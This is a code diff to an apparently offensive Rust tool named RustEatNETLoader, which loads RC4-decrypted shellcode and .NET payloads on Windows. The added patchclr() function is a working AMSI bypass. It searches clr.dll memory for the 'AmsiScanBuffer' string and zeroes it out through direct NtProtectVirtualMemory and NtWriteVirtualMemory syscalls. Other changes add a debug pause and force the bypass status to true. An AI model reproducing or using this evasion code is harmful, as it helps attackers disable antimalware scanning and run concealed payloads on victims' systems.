@@ -34,6 +34,7 @@ use winapi::shared::{
 use std::os::windows::ffi::OsStrExt;
 use std::mem::size_of;
 use winapi::shared::minwindef::ULONG;
+use winapi::shared::minwindef::DWORD;
 use winapi::um::{
     libloaderapi::GetModuleHandleA,
     libloaderapi::GetProcAddress,
@@ -43,7 +44,8 @@ use winapi::um::{
     processthreadsapi::GetCurrentProcess,
     processthreadsapi::GetCurrentProcessId,
     psapi::{MODULEINFO, GetModuleInformation},
-    winnt::{PAGE_EXECUTE_READWRITE, PIMAGE_DOS_HEADER, PIMAGE_EXPORT_DIRECTORY, PIMAGE_NT_HEADERS},
+    winnt::{PAGE_GUARD,MEM_COMMIT,PAGE_EXECUTE_READWRITE,MEMORY_BASIC_INFORMATION,PAGE_READONLY, PIMAGE_DOS_HEADER, 
+        PIMAGE_EXPORT_DIRECTORY, PIMAGE_NT_HEADERS,PAGE_READWRITE,PAGE_EXECUTE_READ},
     winuser::{MB_OK, MessageBoxA},
 };
 
@@ -52,6 +54,137 @@ unsafe extern "system" fn hook_message_box_a(h_wnd: HWND, _: LPCWSTR, _: LPCWSTR
     return 1;
 }
 use ntapi::ntmmapi::{NtProtectVirtualMemory, NtWriteVirtualMemory};
+
+fn is_readable(protect: DWORD, state: DWORD) -> bool {
+    // Check if the protection allows reading
+    if !((protect & PAGE_READONLY) == PAGE_READONLY
+        || (protect & PAGE_READWRITE) == PAGE_READWRITE
+        || (protect & PAGE_EXECUTE_READWRITE) == PAGE_EXECUTE_READWRITE
+        || (protect & PAGE_EXECUTE_READ) == PAGE_EXECUTE_READ)
+    {
+        return false;
+    }
+
+    // Check if PAGE_GUARD is set (which makes memory inaccessible)
+    if (protect & PAGE_GUARD) == PAGE_GUARD {
+        return false;
+    }
+
+    // Check if memory is committed
+    if (state & MEM_COMMIT) != MEM_COMMIT {
+        return false;
+    }
+
+    true
+}
+
+unsafe fn patchclr()->bool{
+
+    let zero = [0u8; 15];
+    let clr_handle = unsafe { LoadLibraryA("c:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll\0".as_ptr() as _) };
+    let amsi_scan_buffer = b"AmsiScanBuffer\0";
+    if clr_handle.is_null() {
+        println!("[+] Cannot get clr handle!");
+        return false;
+    }
+    let mut base_address = clr_handle as LPVOID;
+    loop {
+            let mut mem_info: MEMORY_BASIC_INFORMATION = std::mem::zeroed();
+            
+            if VirtualQuery(
+                base_address,
+                &mut mem_info,
+                std::mem::size_of::<MEMORY_BASIC_INFORMATION>(),
+            ) == 0
+            {
+                break;
+            }
+
+            let region_size = mem_info.RegionSize;
+
+            if mem_info.Protect == PAGE_READONLY {
+                if !is_readable(mem_info.Protect, mem_info.State) {
+                    base_address = (base_address as usize + region_size) as LPVOID;
+                    continue;
+                }
+
+                // Search for AmsiScanBuffer string in the memory region
+                for j in 0..(mem_info.RegionSize - amsi_scan_buffer.len()) {
+                    let current = (mem_info.BaseAddress as usize + j) as *const u8;
+                    
+                    let mut found = true;
+                    for k in 0..amsi_scan_buffer.len() {
+                        if *current.add(k) != amsi_scan_buffer[k] {
+                            found = false;
+                            break;
+                        }
+                    }
+
+                    if found {
+                        let amsi_scan_buffer_address = current as LPVOID;
+                        println!("[+] Found AmsiScanBuffer address in {:p}", amsi_scan_buffer_address);
+
+                        let mut original: ULONG = 0;
+                        let mut new: DWORD = 0;
+                        let mut base_addr = mem_info.BaseAddress;
+                        let mut region_sz = mem_info.RegionSize;
+
+                        // Change memory protection to read-write-execute
+                        let status = syscall!(
+                            "NtProtectVirtualMemory",
+                            -1isize as HANDLE,
+                            &mut base_addr,
+                            &mut region_sz,
+                            PAGE_EXECUTE_READWRITE,
+                            &mut original
+                        );
+
+                        if status != 0 {
+                            println!("[-] Fail to modify AmsiScanBuffer memory permission to READWRITE.");
+                            return false;
+                        }
+
+                        // Write zeros to patch AmsiScanBuffer
+                        let status = syscall!(
+                            "NtWriteVirtualMemory",
+                            -1isize as HANDLE,
+                            amsi_scan_buffer_address,
+                            zero.as_ptr(),
+                            amsi_scan_buffer.len(),
+                            ptr::null_mut::<SIZE_T>()
+                        );
+
+                        if status != 0 {
+                            println!("[-] Fail to patch AmsiScanBuffer.");
+                            return false;
+                        }
+
+                        // Restore original memory protection
+                        let status = syscall!(
+                            "NtProtectVirtualMemory",
+                            -1isize as HANDLE,
+                            &mut base_addr,
+                            &mut region_sz,
+                            original,
+                            &mut new
+                        );
+
+                        if status != 0 {
+                            println!("[-] Fail to modify AmsiScanBuffer memory permission to original state.");
+                            return false;
+                        }
+
+                        return true;
+                    }
+                }
+            }
+
+            base_address = (base_address as usize + region_size) as LPVOID;
+        }
+
+
+    false
+}
 
 unsafe fn detour(module_name: *const i8, fun_name: &str, new_func_address: u64) -> bool {
     let module_handle = GetModuleHandleA(module_name);
@@ -307,7 +440,7 @@ fn setup_bypass() -> bool {
         if !patch_result {
             return false;
         }
-        let amsi_result = EATHookAMSI();
+        let amsi_result = patchclr();
         if !amsi_result {
             return false;
         }
@@ -363,6 +496,9 @@ fn prepare_args() -> (String, Vec<String>) {
 
 fn main() -> Result<(), String> {
     println!("[+] RustEatNETLoader by Alex Lee.");
+
+    let mut s = String::new();
+    std::io::stdin().read_line(&mut s).unwrap();
     println!("[+] Github: https://github.com/alexlee820/RustEatNETLoader");
     let (path, args) = prepare_args();
     let shellcode = decrypt_rc4(&path);
@@ -370,7 +506,7 @@ fn main() -> Result<(), String> {
     let pid = unsafe { GetCurrentProcessId() };
     println!("[+] Current process ID: {}", pid);
     let status = unsafe { setup_bypass() };
-
+    let status = true;
     // windbg debug code
     // let mut s = String::new();
     // std::io::stdin().read_line(&mut s).unwrap();
